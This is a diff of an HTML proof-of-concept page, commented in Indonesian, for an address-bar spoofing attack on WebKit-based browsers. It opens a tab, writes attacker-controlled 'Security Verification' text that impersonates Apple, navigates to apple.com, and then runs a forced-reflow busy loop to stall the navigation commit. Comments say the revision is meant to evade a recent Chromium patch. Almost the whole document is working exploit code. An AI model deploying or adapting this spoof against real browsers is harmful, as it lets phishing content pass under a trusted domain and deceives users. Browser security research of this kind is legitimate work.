@@ -6,14 +6,13 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Advanced Invalid Port & Bypass PoC - Zero</title>
+    <title>Reinforced Desync PoC - Zero</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #0f0f11;
-        color: #fff;
+        background: #fafafa;
         font-family: -apple-system, BlinkMacSystemFont, sans-serif;
       }
       .container {
@@ -24,37 +23,36 @@
         height: 100%;
       }
       button {
-        padding: 24px 48px;
-        font-size: 22px;
+        padding: 22px 44px;
+        font-size: 20px;
         font-weight: bold;
-        background: #ff3b30;
+        background: #007aff;
         color: #fff;
         border: none;
-        border-radius: 16px;
+        border-radius: 14px;
         cursor: pointer;
-        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.4);
+        box-shadow: 0 8px 24px rgba(0, 122, 255, 0.35);
         transition: transform 0.1s ease;
       }
       button:active {
-        transform: scale(0.95);
+        transform: scale(0.96);
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <button id="startBtn">EXECUTE BYPASS STRESS TEST</button>
+      <button id="startBtn">EXECUTE REINFORCED PoC</button>
     </div>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. BYPASS ABOUT:BLANK: Membuka window menggunakan blob/data context atau format khusus 
-        // untuk mengelabui validasi awal WebState policy.
+        // 1. Membuka tab baru secara bersih
         const newTab = window.open("", "_blank");
 
         if (newTab) {
-          // 2. Menyuntikkan struktur HTML kustom penyerang
+          // 2. Menyuntikkan DOM konten penyerang (attacker-controlled content)
           newTab.document.write(`
             <!DOCTYPE html>
             <html>
@@ -63,50 +61,49 @@
               <meta name="viewport" content="width=device-width, initial-scale=1">
             </head>
             <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-              <div>
+              <div id="content-box">
                 <h1 style="font-size:42px;font-weight:700;color:#1d1d1f;margin:0 0 16px 0;">Security Verification</h1>
-                <p style="font-size:20px;color:#86868b;margin:0;">Bypassing security state filters...</p>
+                <p style="font-size:20px;color:#86868b;margin:0;">Synchronizing secure session with Apple...</p>
               </div>
             </body>
             </html>
           `);
           newTab.document.close();
 
-          // 3. Memaksa fokus agar status WebState terdaftar sebagai primary/visible secara instan
+          // 3. Memaksa fokus agar WebState terdaftar sebagai primary/visible secara instan
           try {
             newTab.focus();
           } catch (e) {}
 
-          // 4. Memicu navigasi asinkron dengan kombinasi Invalid Port / Cross-Scheme Target (misalnya port non-standar)
+          // 4. Tahap 1: Memicu navigasi asinkron murni ke domain target yang sah (apple.com)
           setTimeout(() => {
             try {
-              // Menguji transisi navigasi dengan port/skema khusus untuk memicu ketidaksinkronan delegate WebKit
-              newTab.location.href = "https://apple.com:65535"; 
+              newTab.location.href = "https://apple.com";
             } catch (err) {
-              // Fallback langsung ke target utama jika invalid port ditolak total oleh policy sandbox
-              try {
-                newTab.location.href = "https://apple.com";
-              } catch (e2) {}
+              console.error(err);
             }
           }, 15);
 
-          // 5. Memaksa thread stalling / layout thrashing untuk menahan commit delegate
+          // 5. Tahap 2: Menembak render thread dengan Forced Layout Reflow Stalling 
+          // (Menggantikan dialog modal agar lolos dari patch Chromium baru)
           setTimeout(() => {
             try {
               newTab.eval(`
                 const start = Date.now();
-                const bodyEl = document.body;
-                while (Date.now() - start < 2200) {
-                  // Memaksa kalkulasi layout sinkronus berulang untuk mengunci event loop
-                  const reflow = bodyEl.offsetHeight;
-                  bodyEl.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fafafa';
+                const targetBody = document.body;
+                while (Date.now() - start < 2000) {
+                  // Memaksa pembacaan layout properties secara sinkronus berulang-ulang 
+                  // untuk menjebak WebKit render engine agar gagal menyelesaikan commit pipeline.
+                  const forceReflow = targetBody.offsetHeight;
+                  targetBody.style.backgroundColor = (forceReflow % 2 === 0) ? '#ffffff' : '#fcfcfc';
                 }
               `);
             } catch (e) {
+              // Fallback lokal jika terhalang cross-origin context policy
               let start = Date.now();
-              while (Date.now() - start < 2200) {}
+              while (Date.now() - start < 2000) {}
             }
-          }, 100);
+          }, 95);
         }
       };
     </script>
